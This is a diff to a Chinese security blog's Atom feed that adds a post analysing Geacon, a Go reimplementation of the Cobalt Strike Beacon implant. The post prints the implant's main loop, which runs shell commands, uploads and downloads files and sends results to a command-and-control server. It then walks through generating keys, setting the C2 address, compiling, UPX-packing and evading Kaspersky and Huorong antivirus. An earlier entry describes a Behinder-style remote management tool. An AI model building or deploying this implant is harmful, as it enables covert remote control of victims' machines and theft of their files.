@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://thekingofduck.github.io</id>
     <title>CoolCat&apos; Blog</title>
-    <updated>2020-02-21T12:40:40.084Z</updated>
+    <updated>2020-02-21T12:57:25.009Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://thekingofduck.github.io"/>
     <link rel="self" href="https://thekingofduck.github.io/atom.xml"/>
@@ -54,6 +54,289 @@ client 127.0.0.1:55555
 <p>这个项目只是自己学习Golang过程中实践的产物，代码写得很垃圾，但是注释都尽量写清楚的，通讯流量走tcp协议，采用aes动态加密，可以说是完全模仿冰蝎。基础功能执行命令已实现，模块化的检查存在的杀毒软件以及下载文件写完，其他模块还得在花时间。相比同类小工具我觉得最大的优点就是支持了动态加密，并且可以同时管理多个会话。</p>
 <p><strong>本项目接受建议</strong></p>
 <p>比如希望增加特定功能，再比如某个位置代码写得不规范，或是有bug，有空我会慢慢改。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Geacon代码通读&上线指南]]></title>
+        <id>https://thekingofduck.github.io/post/geacon-program-code-analysis/</id>
+        <link href="https://thekingofduck.github.io/post/geacon-program-code-analysis/">
+        </link>
+        <updated>2020-02-19T12:42:37.000Z</updated>
+        <summary type="html"><![CDATA[<p>Implement CobaltStrike's Beacon in Go</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>Implement CobaltStrike's Beacon in Go</p>
+<!-- more -->
+<h3 id="0x01-写在前面">0x01 写在前面</h3>
+<p>项目地址: https://github.com/darkr4y/geacon</p>
+<p>项目说明:</p>
+<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/readme.png" alt="readme" loading="lazy"></figure>
+<p>这都说了啥...正好在拿go写c2，看下逻辑学习一下。</p>
+<p>代码目录：</p>
+<pre><code>├─cmd
+│  │  main.go                             //主程序
+│  │
+│  ├─config
+│  │      c2profile.go
+│  │      config.go                       //c2配置
+│  │
+│  ├─crypt
+│  │      aes.go
+│  │      rand.go
+│  │      rsa.go
+│  │
+│  ├─packet
+│  │      commands.go
+│  │      http.go
+│  │      packet.go
+│  │
+│  ├─sysinfo
+│  │      meta.go
+│  │      sysinfo_darwin.go
+│  │      sysinfo_linux.go
+│  │      sysinfo_windows.go
+│  │
+│  └─util
+│          util.go
+│
+├─scripts
+│      icons.cna                           //cs脚本
+│
+└─tools
+    └─BeaconTool                           //Beacon RSA生成工具
+</code></pre>
+<h3 id="0x02-代码分析">0x02 代码分析</h3>
+<p>主程序mian.go在cmd目录下:</p>
+<pre><code>package main
+
+import (
+	&quot;bytes&quot;
+	&quot;fmt&quot;
+	&quot;geacon/cmd/config&quot;
+	&quot;geacon/cmd/crypt&quot;
+	&quot;geacon/cmd/packet&quot;
+	&quot;geacon/cmd/util&quot;
+	&quot;io&quot;
+	&quot;os&quot;
+	&quot;time&quot;
+)
+
+
+
+func main() {
+
+	ok := packet.FirstBlood()
+	if ok {
+		for ; ;  {
+			resp := packet.PullCommand()
+			if resp != nil {
+				totalLen := resp.Response().ContentLength
+				if totalLen &gt; 0 {
+					hmacHash := resp.Bytes()[totalLen - crypt.HmacHashLen :]
+					fmt.Printf(&quot;hmac hash: %v\n&quot;, hmacHash)
+					//TODO check the hmachash
+					restBytes := resp.Bytes()[ : totalLen - crypt.HmacHashLen]
+					decrypted := packet.DecryptPacket(restBytes)
+					timestamp := decrypted[:4]
+					fmt.Printf(&quot;timestamp: %v\n&quot;,timestamp)
+					lenBytes := decrypted[4:8]
+					packetLen := packet.ReadInt(lenBytes)
+
+					decryptedBuf := bytes.NewBuffer(decrypted[8:])
+					for ; ;  {
+						if packetLen &lt;= 0 {
+							break
+						}
+						cmdType , cmdBuf := packet.ParsePacket(decryptedBuf , &amp;packetLen)
+						if cmdBuf != nil {
+							switch cmdType {
+							//shell
+							case packet.CMD_TYPE_SHELL:
+								shellPath , shellBuf := packet.ParseCommandShell(cmdBuf)
+								result := packet.Shell(shellPath,shellBuf)
+								finalPaket := packet.MakePacket(0,result)
+								packet.PushResult(finalPaket)
+
+							case packet.CMD_TYPE_UPLOAD_START:
+								filePath , fileData := packet.ParseCommandUpload(cmdBuf)
+								packet.Upload(string(filePath),fileData)
+
+							case packet.CMD_TYPE_UPLOAD_LOOP:
+								filePath , fileData := packet.ParseCommandUpload(cmdBuf)
+								packet.Upload(string(filePath),fileData)
+
+							case packet.CMD_TYPE_DOWNLOAD:
+								filePath := cmdBuf
+								//TODO encode
+								strFilePath := string(filePath)
+								fileInfo, err := os.Stat(strFilePath)
+								if err != nil {
+									//TODO notify error to c2
+									break
+								}
+								fileLen := fileInfo.Size()
+								test := int(fileLen)
+								fileLenBytes := packet.WriteInt(test)
+								requestID := crypt.RandomInt(10000, 99999)
+								requestIDBytes := packet.WriteInt(requestID)
+								result := util.BytesCombine(requestIDBytes,fileLenBytes,filePath)
+								finalPaket := packet.MakePacket(2,result)
+								packet.PushResult(finalPaket)
+
+								fileHandle , err := os.Open(strFilePath)
+								if err != nil {
+									break
+								}
+								var fileContent []byte
+								fileBuf := make([]byte, 512 * 1024)
+								for ; ;  {
+									n, err := fileHandle.Read(fileBuf)
+									if err != nil &amp;&amp; err != io.EOF {
+										break
+									}
+									if n == 0 {
+										break
+									}
+									fileContent = fileBuf[:n]
+									result = util.BytesCombine(requestIDBytes,fileContent)
+									finalPaket = packet.MakePacket(8,result)
+									packet.PushResult(finalPaket)
+								}
+
+								finalPaket = packet.MakePacket(9,requestIDBytes)
+								packet.PushResult(finalPaket)
+
+
+
+							case packet.CMD_TYPE_SLEEP:
+								sleep := packet.ReadInt(cmdBuf[:4])
+								//jitter := packet.ReadInt(cmdBuf[4:8])
+								//fmt.Printf(&quot;Now sleep is %d ms, jitter is %d\n&quot;,sleep,jitter)
+								config.WaitTime = time.Duration(sleep) * time.Millisecond
+
+							default:
+								errIdBytes := packet.WriteInt(0) // must be zero
+								arg1Bytes := packet.WriteInt(0) // for debug
+								arg2Bytes := packet.WriteInt(0)
+								errMsgBytes := []byte(&quot;You are now using geacon coded by darkr4y,and he may not have implemented this feature yet cuz life is shit.&quot;)
+								result := util.BytesCombine(errIdBytes,arg1Bytes,arg2Bytes,errMsgBytes)
+								finalPaket := packet.MakePacket(31,result)
+								packet.PushResult(finalPaket)
+
+
+							}
+						}
+					}
+				}
+			}			time.Sleep(config.WaitTime)
+		}
+	}
+
+	
+}
+</code></pre>
+<p>main.go line 3-13 导入包<br>
+main.go line 16 程序入口<br>
+main.go line 18 调用packet中的FirstBlood方法（packet.go line 158-170）,代码如下：</p>
+<pre><code>func FirstBlood() bool {//定义返回类型为布尔值
+    
+    /*
+    调用EncryptedMetaInfo方法（packet.go line 130-156）并赋值给encryptedMetaInfo。
+    其中EncryptedMetaInfo方法的作用是调用MakeMetaInfo方法（packet.go line 118-128）并将该方法返回的值字节交给rsa.go中RsaEncrypt方法加密，最终返回加密后的字符串。
+    其中RsaEncrypt在rsa.go line 12-24，在line 14会发现它调用了config.go中line 8 RsaPublicKey变量的值。此处是后面需要修改后再编译的位置1。
+    */
+	encryptedMetaInfo = EncryptedMetaInfo() 
+
+    
+    /*
+    调用HttpGet函数循环发送上线包，如果发送成功就打断循环，休眠，返回True给main.go line 18的ok。
+    其中config.GetUrl为在config.go中line 31 GetUrl变量的值，由plainHTTP,C2变量以及字符串&quot;/load&quot;拼接而成，此处也是后面需要修改后再编译的位置2。   
+    */
+    
+	for ; ;  {
+		resp := HttpGet(config.GetUrl,encryptedMetaInfo)
+		if resp != nil {
+			fmt.Printf(&quot;firstblood: %v\n&quot;,resp)
+			break
+		}
+		time.Sleep(500 * time.Millisecond)
+	}
+	
+
+	time.Sleep(config.WaitTime)
+	return true
+}
+</code></pre>
+<p>main.go line 19  判断上线包是否发送成功，如果成功进入下一部分，不成功则不执行任何代码。</p>
+<p>main.go line 20  开始for循环</p>
+<p>main.go line 21  该部分为心跳包，调用packet中的PullCommand方法（packet.go line 172-177）循环发送变量encryptedMetaInfo(在发送上线包时获取到的),代码如下：</p>
+<pre><code>func PullCommand() *req.Resp {
+    /*
+    此处未作容错处理，而是直接将所有返回包丢给下一行处理。
+    */
+	resp := HttpGet(config.GetUrl,encryptedMetaInfo)
+	fmt.Printf(&quot;pullcommand: %v\n&quot;,resp.Request().URL)
+	return resp
+}
+</code></pre>
+<p>main.go line 22-23 如果代码没出错就接着运行，出错了就休眠一会儿在继续。休眠时长在config.go中line 20 WaitTime变量中获取<br>
+main.go line 24-25  获取resp中返回包中Content-Length的值,如果大于0就继续运行<br>
+main.go line 25-36  计算消息hmacHash,restBytes等,然后调用packet中的DecryptPacket方法（packet.go line 40-46）对消息进行解密。具体变量类型之类的可参考：</p>
+<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/debug.png" alt="debug" loading="lazy"></figure>
+<p>main.go line 37-40 开始下一个循环，并在循环前先判断packetLen的字节是否小于0，如果是就打断循环。</p>
+<p>main.go line 41 调用packet.go中ParsePacket方法(line 54-76)处理decryptedBuf 和&amp;packetLen并返回commandType和commandBuf。（计算过程复杂，此处不作详细，可cs生成的paylaod进行理解）</p>
+<p>main.go line 42-120行 根据返回的cmdType的不同执行不同的功能模块，以执行命令为例，假如cmdType的返回值为78时就会进入命令执行流程，代码如下：</p>
+<pre><code>/*
+packet.CMD_TYPE_SHELL的值为command.go line 14的CMD_TYPE_SHELL常量
+如果条件满足则调用packet.go中ParseCommandShell方法(line 20-47)处理cmdBuf，并将处理结果交给Shell方法(line 49-76)执行命令。后续即将执行结果发送回控制端。
+*/
+switch cmdType {
+//shell
+case packet.CMD_TYPE_SHELL:
+	shellPath , shellBuf := packet.ParseCommandShell(cmdBuf)
+	result := packet.Shell(shellPath,shellBuf)
+	finalPaket := packet.MakePacket(0,result)
+	packet.PushResult(finalPaket)
+</code></pre>
+<p>传送执行结果的方法代码如下：</p>
+<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/PushResult.png" alt="PushResult" loading="lazy"></figure>
+<p>执行命令的方法如下：</p>
+<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/Shell.png" alt="Shell" loading="lazy"></figure>
+<p>可以看到作者有考虑到多平台上线问题。</p>
+<p>可惜：</p>
+<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/Shell2.png" alt="Shell2" loading="lazy"></figure>
+<p>cmdType的值没有计算正确（测试环境 win10下）</p>
+<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/cmd.png" alt="cmd" loading="lazy"></figure>
+<p>尝试过多平台兼容的人都知道有多狗。（golang版本问题，需要更新）</p>
+<p>最后如果没有对上会进入作者写的一个debug流程，然后回传到服务器告诉你：</p>
+<pre><code>You are now using geacon coded by darkr4y,and he may not have implemented this feature yet cuz life is shit.
+</code></pre>
+<h3 id="0x03-编译上线">0x03 编译上线</h3>
+<p>如果有仔细看上面的代码分析会发现所有的c2配置作者都放到了config/config.go里面，对于修改后再编译就可以了。</p>
+<p>上线共分为三步：</p>
+<h4 id="加载iconscna">加载icons.cna</h4>
+<p>加载cs插件...</p>
+<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/icons.png" alt="icons" loading="lazy"></figure>
+<p>如名字所写，其作用修改beacon会话图标的。</p>
+<h4 id="rsa公钥私钥生成">RSA公钥/私钥生成</h4>
+<p>作者在项目里提供了生成工具（/tools/BeaconTool）：</p>
+<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/tools1.png" alt="tools1" loading="lazy"></figure>
+<p>pemPublicBase64以及pemPrivateBase64即为需要的值，.beacon_keys其实就是cs根目录下的.cobaltstrike.beacon_keys文件。</p>
+<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/tools2.png" alt="tools2" loading="lazy"></figure>
+<p>下载该文件，改下代码，运行一下即可获取需要的值:</p>
+<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/tools3.png" alt="tools3" loading="lazy"></figure>
+<h4 id="编译上线">编译上线</h4>
+<p>直接将代码clone到GOPATH下(避免文件来回复制),然后修改/beacon/cmdconfig/config.go</p>
+<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/code.png" alt="code" loading="lazy"></figure>
+<p>改完go build main.go一下，上线。</p>
+<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/on.png" alt="on" loading="lazy"></figure>
+<p>如图一台linux一台Windows，mac维修去了，尚未测试。</p>
+<h3 id="0x04-总结">0x04 总结</h3>
+<p>正常打包后7M，upx压缩一下2m。卡巴和火绒正常上线，免杀。</p>
+<figure data-type="image" tabindex="13"><img src="https://thekingofduck.github.io/post-images/avs.png" alt="avs" loading="lazy"></figure>
+<p>bug挺多的，不过基础功能已经实现了，跟着逻辑调整一下还是会很香的。</p>
+<hr>
+<p>The End ，继续写bug。</p>
+<hr>
 ]]></content>
     </entry>
     <entry>
